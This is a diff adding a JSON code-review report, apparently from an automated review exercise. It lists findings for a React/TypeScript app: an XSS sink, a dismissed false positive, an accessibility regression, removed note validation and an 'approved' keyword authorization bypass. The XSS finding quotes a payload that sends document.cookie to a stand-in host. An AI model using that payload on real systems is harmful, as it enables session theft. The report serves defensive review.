@@ -1,0 +1,75 @@
+{
+  "schemaVersion": 1,
+  "baseSha": "f81c3e56a46338c77cce0d0e81b8ae150db5da19",
+  "headSha": "8292b946c6a756980ecaf6aa1d99adf7105ea597",
+  "comparison": "review-base..review-head",
+  "sourceSha": "8b68ece04bbbfa2958ca8a777795714b906716d0",
+  "reviewerSession": "opencode-glm-5.3-review-gauntlet-01",
+  "mergeDecision": "request-changes",
+  "findings": [
+    {
+      "id": "SEC-001",
+      "severity": "critical",
+      "source": "semgrep",
+      "decision": "fix",
+      "file": "src/components/ActionComposer.tsx",
+      "line": 31,
+      "scenario": "A reviewer types <img src=x onerror=fetch('//evil/'+document.cookie)> into the Reviewer note textarea; the note state is passed straight into dangerouslySetInnerHTML and executes as HTML on the next render.",
+      "impact": "Arbitrary HTML and script injection from fully reviewer-controlled input; the payload runs in the application origin on every render of the note preview instead of being rendered as plain text.",
+      "evidence": "Reproduced with Semgrep rule react-dangerous-html-review against the review head: ActionComposer.tsx:31 renders the dynamic note state through dangerouslySetInnerHTML={{ __html: note }} with no sanitization, so it is a true positive unlike SafeAnnouncement whose input is a source-controlled constant; React auto-escapes text children, so the confirmed fix renders {note} as text.",
+      "fix": "Replace the dangerouslySetInnerHTML preview in src/components/ActionComposer.tsx with a plain React text child: <div className=\"review-preview\">{note}</div>.",
+      "testPath": "tests/review-regressions.test.ts"
+    },
+    {
+      "id": "SCAN-001",
+      "severity": "info",
+      "source": "semgrep",
+      "decision": "dismiss",
+      "file": "src/components/SafeAnnouncement.tsx",
+      "line": 7,
+      "scenario": "The same Semgrep rule react-dangerous-html-review also flags SafeAnnouncement.tsx:7 for using dangerouslySetInnerHTML, producing a second warning alongside the exploitable note sink.",
+      "impact": "None: the rendered markup is a fixed scheduled-maintenance banner that ships inside the application bundle and never varies at runtime.",
+      "evidence": "Disproved by source: the injected string is the module-level const trustedAnnouncement defined at SafeAnnouncement.tsx:1 with no interpolation, props, state, or user input anywhere in the file; the HTML is static and source-controlled, so no runtime data can reach the sink. This proved false positive is retained in the codebase and dismissed here rather than silenced, per the review brief.",
+      "testPath": null
+    },
+    {
+      "id": "A11Y-001",
+      "severity": "high",
+      "source": "manual",
+      "decision": "fix",
+      "file": "src/components/WorkQueue.tsx",
+      "line": 16,
+      "scenario": "A keyboard-only user tabs through the work queue and can neither focus nor activate any row: the PR replaced the native button element with a div that only responds to onClick.",
+      "impact": "The entire queue becomes mouse-only; keyboard and screen-reader users cannot select work items, and assistive technology no longer announces rows as interactive controls.",
+      "evidence": "Verified in the review head: WorkQueue.tsx:16 renders <div onClick=...> with no role, no tabIndex, and no key handler, while the base side of the protected diff shows the element was <button type=\"button\">; restoring the native button element restores focus order plus Enter and Space activation and button semantics for keyboard users.",
+      "fix": "Render queue rows as native <button type=\"button\"> elements with the existing className, key, and onClick in src/components/WorkQueue.tsx.",
+      "testPath": "tests/review-regressions.test.ts"
+    },
+    {
+      "id": "VAL-001",
+      "severity": "high",
+      "source": "manual",
+      "decision": "fix",
+      "file": "src/components/ActionComposer.tsx",
+      "line": 48,
+      "scenario": "Clear the Reviewer note or type fewer than eight characters and activate Save draft; the head button is only disabled while saving, so a short note is submitted immediately.",
+      "impact": "Empty or near-empty reviewer notes reach the server and persist on the work item, destroying the audit quality that the client guard previously enforced before submission.",
+      "evidence": "The protected diff removes disabled={saving || note.trim().length < 8} and the explicit type from the save button at ActionComposer.tsx:48, and the head server also lost its note-length check, so nothing rejects a short note anywhere; the fix restores the client disabled guard with type=\"button\" and the server-side meaningful-reviewer-note validation.",
+      "fix": "Restore disabled={saving || note.trim().length < 8} and type=\"button\" on the save button in src/components/ActionComposer.tsx, and restore the eight-character note guard in src/server/reviewPolicy.ts.",
+      "testPath": "tests/review-regressions.test.ts"
+    },
+    {
+      "id": "POL-001",
+      "severity": "critical",
+      "source": "manual",
+      "decision": "fix",
+      "file": "src/server/reviewPolicy.ts",
+      "line": 4,
+      "scenario": "Submit a draft with status Ready and a note merely containing the word approved for a Blocked or Escalated work item; the early return at reviewPolicy.ts:4 skips every remaining server guard.",
+      "impact": "Approval wording becomes an authorization bypass: blocked and escalated work reaches Ready without evidence requirements, and note-length validation is disabled server-wide for any note containing the magic word.",
+      "evidence": "Reproduced on the review head: assertAllowedTransition({ status: 'Blocked' }, { note: 'approved by reviewer', status: 'Ready' }) returns without throwing, exactly the case the protected reviewPolicy.test.ts expects to throw /cannot transition/; the client additionally coerced High-priority drafts to Ready before sending (ActionComposer.tsx:18-19 in the head), so the fix removes the server early return, restores the note-length guard, and deletes the client normalization so blocked or escalated items can never reach Ready by wording.",
+      "fix": "Delete the approved early return in src/server/reviewPolicy.ts, restore the eight-character meaningful-note guard ahead of the Blocked/Escalated to Ready rule, and remove the client-side normalizedStatus coercion in src/components/ActionComposer.tsx.",
+      "testPath": "tests/review-regressions.test.ts"
+    }
+  ]
+}
